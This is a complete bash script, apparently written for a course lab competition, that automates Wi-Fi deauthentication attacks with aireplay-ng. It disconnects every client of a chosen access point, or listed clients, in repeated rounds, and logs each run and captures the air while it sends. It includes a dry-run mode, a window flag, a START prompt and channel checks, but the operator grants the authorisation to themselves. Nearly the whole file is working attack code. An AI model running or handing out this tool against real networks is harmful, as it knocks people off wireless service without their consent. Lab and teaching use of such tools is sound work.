#!/usr/bin/env bash
#
# competition-deauth.sh — deauthenticate clients of one access point, inside the evaluation window
#
# For the Lab #10 competition only. The course staff's written reply allows deauthentication of
# clients on the evaluation network during the official window. Every check runs before the first
# frame is sent. A real run sends nothing unless all of these hold:
#   - --in-window is given, which you pass only while the official window is open
#   - you type START at the prompt
#   - the monitor interface reads back the channel given with -c
#   - the run's own capture hears the BSSID within about 10 s
#
# Without -f, each round is one aireplay-ng call with no destination. That sends deauthentication to
# the broadcast address, so every client of the AP is disconnected. With -f, each round is one call
# per client in the file (one MAC per line; # starts a comment). The AP and this card are never targets.
# The run folder holds deauth.log (every send), aireplay.txt (the raw output), capture-01.cap (the air
# during the run) and capture-01-health.txt (the same table, printed at the end). Ctrl-C stops the run,
# and WiFi is restored on exit. With -M, the monitor interface stays up for the run that owns it.
#
# --dry-run prints the plan and exits. It needs no root and no card, and sends nothing.
#
# Usage:
#   ./scripts/competition-deauth.sh -b <BSSID> -c <CHANNEL> [-u <HH:MM>] --dry-run
#   sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> [-u <HH:MM>] --in-window
#   sudo ./scripts/competition-deauth.sh -M wlp2s0mon -b <BSSID> -c <CHANNEL> [-u <HH:MM>] --in-window
#
#   -i  Wi-Fi interface. The run starts monitor mode on it, and restores WiFi on exit
#   -M  monitor interface that is already up, such as the one wep-crack.sh uses. The run neither
#       starts nor stops it, nor changes its channel, and leaves it up on exit, so a round can run
#       during a crack. Give -i or -M, not both. Neither is needed with --dry-run
#   -b  BSSID of the network to target
#   -c  the network's channel
#   -u  optional: HH:MM on this machine's clock: when the window closes. The run stops then.
#   -f  optional: file of client MACs, one per line; # starts a comment. Without it, the broadcast address.
#   -r  optional: stop after this many rounds (default: until -u, or Ctrl-C)
#   --in-window  needed for a real run, and only while the official window is open
#   --dry-run    print the plan and exit
#
# A round sends 5 frames to each target, then waits 2 s. An aireplay-ng call still running after 30 s
# is stopped, and the run goes on. An aireplay-ng call that exits with an error ends the run at once.
#
set -u

SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
LAB_DIR=$(cd "$SCRIPT_DIR/.." && pwd)
LOGDIR="$LAB_DIR/logs"
# shellcheck source=wifi-lib.sh
source "$SCRIPT_DIR/wifi-lib.sh"

FRAMES=5        # frames per aireplay-ng call
PAUSE=2         # seconds between rounds
CALL_LIMIT=30   # seconds before one aireplay-ng call is stopped

# The two long options are taken out before getopts reads the rest.
IN_WINDOW=0
DRY_RUN=0
ARGS=()
for arg in "$@"; do
  case "$arg" in
    --in-window) IN_WINDOW=1 ;;
    --dry-run) DRY_RUN=1 ;;
    *) ARGS+=("$arg") ;;
  esac
done
set -- "${ARGS[@]}"

IFACE=""
MONIFACE=""
BSSID=""
CHANNEL=""
CLIENTS=""
ROUNDS=""
UNTIL=""
while getopts ":i:M:b:c:f:r:u:h" opt; do
  case "$opt" in
    i) IFACE="$OPTARG" ;;
    M) MONIFACE="$OPTARG" ;;
    b) BSSID="${OPTARG^^}" ;;
    c) CHANNEL="$OPTARG" ;;
    f) CLIENTS="$OPTARG" ;;
    r) ROUNDS="$OPTARG" ;;
    u) UNTIL="$OPTARG" ;;
    h) usage 0 ;;
    *) usage ;;
  esac
done

# Everything up to the START prompt runs without root and changes nothing.
[[ -n "$BSSID" && -n "$CHANNEL" ]] || usage
[[ -z "$IFACE" || -z "$MONIFACE" ]] || die "Give -i or -M, not both: -i starts monitor mode here, -M uses one that is up."
(( DRY_RUN )) || [[ -n "$IFACE$MONIFACE" ]] || usage
(( DRY_RUN || IN_WINDOW )) || die "Refusing to run. Pass --in-window, and only while the official evaluation window is open."
[[ "$BSSID" =~ ^([0-9A-F]{2}:){5}[0-9A-F]{2}$ ]] || die "-b must be a BSSID such as 11:22:33:44:55:66"
[[ "$CHANNEL" =~ ^[0-9]+$ ]] || die "-c must be a channel number, e.g. 6"
[[ -z "$ROUNDS" || "$ROUNDS" =~ ^[1-9][0-9]*$ ]] || die "-r must be a whole number above 0"
if [[ -n "$UNTIL" ]]; then
  [[ "$UNTIL" =~ ^([01][0-9]|2[0-3]):[0-5][0-9]$ ]] || die "-u must be a time such as 12:30, on this machine's clock"
  UNTIL_EPOCH=$(date -d "today $UNTIL" +%s)
  (( UNTIL_EPOCH > $(date +%s) )) || die "The -u time $UNTIL has already passed. Nothing was sent."
fi

# The targets: the broadcast address, or with -f, each client MAC in the file.
TARGETS=(broadcast)
if [[ -n "$CLIENTS" ]]; then
  [[ -r "$CLIENTS" ]] || die "Cannot read $CLIENTS"
  mapfile -t STATIONS < <(awk '$1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ { print toupper($1) }' "$CLIENTS" | sort -u)
  # A typo in the file would otherwise drop a client without a word, so count what was ignored.
  IGNORED=$(awk '$1 !~ /^#/ && NF && $1 !~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ { n++ } END { print n + 0 }' "$CLIENTS")
  (( IGNORED == 0 )) || echo "[!] Ignoring $IGNORED line(s) in $CLIENTS that are not MAC addresses."
  (( ${#STATIONS[@]} > 0 )) || die "No client MAC addresses in $CLIENTS"
  # This card's own address and the AP are never targets. With -M, the card is the monitor interface.
  OWN=$(cat "/sys/class/net/${MONIFACE:-${IFACE:-none}}/address" 2>/dev/null | tr 'a-f' 'A-F')
  TARGETS=()
  for sta in "${STATIONS[@]}"; do
    if [[ "$sta" == "$BSSID" || "$sta" == "$OWN" ]]; then
      echo "[!] Skipping $sta: it is the AP or this card."
    else
      TARGETS+=("$sta")
    fi
  done
  (( ${#TARGETS[@]} > 0 )) || die "No clients left to deauthenticate after the checks."
fi

LIMIT_TEXT="until Ctrl-C"
[[ -n "$UNTIL" ]] && LIMIT_TEXT="until $UNTIL"
if [[ -n "$ROUNDS" ]]; then
  LIMIT_TEXT="$ROUNDS round(s)"
  [[ -n "$UNTIL" ]] && LIMIT_TEXT="$LIMIT_TEXT, or until $UNTIL, whichever comes first"
fi
if [[ "${TARGETS[0]}" == broadcast ]]; then
  echo "[*] BSSID $BSSID on channel $CHANNEL: broadcast deauthentication (every client of the AP), $FRAMES frames a round, $LIMIT_TEXT."
  echo "[*] One round is one call: aireplay-ng --deauth $FRAMES -a $BSSID <monitor>"
else
  echo "[*] BSSID $BSSID on channel $CHANNEL: ${#TARGETS[@]} listed client(s), $FRAMES frames to each client a round, $LIMIT_TEXT."
  printf '    %s\n' "${TARGETS[@]}"
  echo "[*] One round is one call per client: aireplay-ng --deauth $FRAMES -a $BSSID -c <client> <monitor>"
fi

if [[ -n "$MONIFACE" ]]; then
  echo "[*] $MONIFACE is already in monitor mode: this run uses it as it is, and leaves it up."
fi

if (( DRY_RUN )); then
  echo "[*] Dry run: nothing was sent, and the card was not touched."
  exit 0
fi

wifi_preflight airmon-ng airodump-ng aireplay-ng iw ip nmcli systemctl timeout tshark gawk
if [[ -n "$MONIFACE" ]]; then
  [[ "$(iface_type "$MONIFACE")" == monitor ]] ||
    die "$MONIFACE is not in monitor mode, so nothing was sent. Check: iw dev. Or give -i to start monitor mode here."
  MON=$MONIFACE
else
  wifi_require_iface "$IFACE"
fi

read -r -p "Type START to send deauthentication frames to these targets: " answer || answer=""
[[ "$answer" == START ]] || die "Cancelled. Nothing was sent."

RUNDIR=$(new_run_dir "$LOGDIR" "deauth-ch$CHANNEL") || die "Could not create a run folder in $LOGDIR"
AIRMON_LOG="$RUNDIR/airmon.log"
: > "$AIRMON_LOG"
LOG="$RUNDIR/deauth.log"
RAW="$RUNDIR/aireplay.txt"

# Refuses to send unless the monitor interface reads back the channel given with -c.
check_channel() {
  local got
  got=$(iw dev "$MON" info 2>/dev/null | awk '$1 == "channel" { print $2; exit }')
  if [[ "$got" != "$CHANNEL" ]]; then
    echo "[!] $MON reports channel '${got:-none}', not $CHANNEL. Nothing was sent." | tee -a "$LOG"
    exit 1
  fi
  echo "[*] $MON reports channel $CHANNEL." | tee -a "$LOG"
}

wifi_guard "${IFACE:-$MONIFACE}"
if [[ -n "$MONIFACE" ]]; then
  # Another run owns this monitor. Set before anything else can exit, so the exit leaves it up.
  WIFI_SHARED_MONITOR=1
  echo "[*] Using $MON as it is, already in monitor mode. This run does not start, stop or re-channel it."
else
  wifi_monitor_start "$IFACE"
  wifi_set_channel "$CHANNEL"
fi
{
  echo "# BSSID $BSSID  channel $CHANNEL  frames $FRAMES  pause ${PAUSE}s  call limit ${CALL_LIMIT}s  rounds ${ROUNDS:-no limit}  until ${UNTIL:-Ctrl-C}  start $(date +%F_%T)"
  echo "# targets: ${TARGETS[*]}"
} | tee "$LOG"

# With -M, the channel is checked before the run's own capture starts: its airodump-ng -c would
# move the other run's card if the channel were wrong.
if [[ -n "$MONIFACE" ]]; then check_channel; fi

# The run's own capture, in the background on the same monitor interface (wep-crack.sh does the same).
# Nothing is sent unless it is still running a moment later, because without it there is no evidence.
airodump_start "$RUNDIR/capture" "$CHANNEL" "$BSSID" bg
REPORT_CAP="$RUNDIR/capture-01.cap"
REPORT_BSSID="$BSSID"
sleep 2
kill -0 "${WIFI_PIDS[-1]}" 2>/dev/null || die "airodump-ng stopped at once, so there is no capture. Nothing was sent."

# aireplay-ng cannot read this card's channel (it reports -1), so the tool runs it with
# --ignore-negative-one. That is only safe if the card is on the requested channel and the run's own
# capture hears the AP, so both are checked here, before the first call.
check_channel
heard=0
for _ in {1..10}; do
  if awk -F', *' -v b="$BSSID" 'toupper($1) == b && $10 + 0 > 0 { found = 1 } END { exit !found }' "$RUNDIR/capture-01.csv" 2>/dev/null; then
    heard=1
    break
  fi
  sleep 1
done
if (( ! heard )); then
  echo "[!] The run's capture does not hear $BSSID within 10 s. Nothing was sent." | tee -a "$LOG"
  exit 1
fi
echo "[*] The run's capture hears $BSSID." | tee -a "$LOG"

stopped_at_until=0
failed=0
round=1
while [[ -z "$ROUNDS" ]] || (( round <= ROUNDS )); do
  for tgt in "${TARGETS[@]}"; do
    if [[ -n "$UNTIL" ]] && (( $(date +%s) >= UNTIL_EPOCH )); then
      echo "$(date +%T) window end $UNTIL reached: stopping" | tee -a "$LOG"
      stopped_at_until=1
      break 2
    fi
    if [[ "$tgt" == broadcast ]]; then
      dest=()
    else
      dest=(-c "$tgt")
    fi
    out=$(timeout "$CALL_LIMIT" aireplay-ng --ignore-negative-one --deauth "$FRAMES" -a "$BSSID" "${dest[@]}" "$MON" 2>&1)
    rc=$?
    printf '%s\n' "$out" >> "$RAW"
    last=$(printf '%s\n' "$out" | tail -n 1)
    [[ -n "$last" ]] || last="(no output)"
    (( rc == 124 )) && last="stopped after ${CALL_LIMIT} s: $last"
    (( rc != 0 && rc != 124 )) && last="exit $rc: $last"
    echo "$(date +%T) round $round $tgt: $last" | tee -a "$LOG"
    if (( rc != 0 && rc != 124 )); then
      echo "[!] aireplay-ng exited with an error, so the run stops here. Its output is in $RAW." | tee -a "$LOG"
      failed=1
      break 2
    fi
  done
  round=$((round + 1))
  if [[ -z "$ROUNDS" ]] || (( round <= ROUNDS )); then sleep "$PAUSE"; fi
done
echo "# end $(date +%F_%T)" >> "$LOG"
if (( failed )); then
  echo "[!] Stopped after an aireplay-ng error. Log: $LOG. Capture: $RUNDIR/capture-01.cap"
  exit 1
elif (( stopped_at_until )); then
  echo "[*] Stopped at the window end, $UNTIL. Log: $LOG. Capture: $RUNDIR/capture-01.cap"
else
  echo "[*] Done: $((round - 1)) round(s). Log: $LOG. Capture: $RUNDIR/capture-01.cap"
fi
